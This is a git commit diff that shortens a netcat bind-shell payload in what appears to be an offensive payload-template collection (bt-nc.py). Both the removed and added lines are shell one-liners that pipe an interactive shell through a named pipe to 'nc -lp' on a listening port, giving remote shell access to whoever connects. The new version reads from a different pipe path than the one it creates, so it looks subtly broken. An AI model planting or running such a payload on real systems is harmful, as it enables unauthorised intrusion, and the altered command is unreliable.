57790e3fce56ee5461ffc5f1b976f803741088e8
Philippe Grégoire <git@pgregoire.xyz>
2022-06-19 21:39:03 -0400

    bt-nc: shorten

--- pop/p/bt-nc.py
+++ pop/p/bt-nc.py
@@ -23,5 +23,5 @@ LANG = 'sh'
 EXEC = 'PAYLOAD'
 
 pl = '''
-rm /tmp/VAR1;mkfifo /tmp/VAR1;cat /tmp/VAR1|sh -i 2>&1|nc -lp ARG1>/tmp/VAR1;rm /tmp/VAR1
+rm /tmp/VAR1;mkfifo /tmp/VAR1;sh -i</tmp/VAR 2>&1|nc -lp ARG1>/tmp/VAR1;rm /tmp/VAR1
 '''
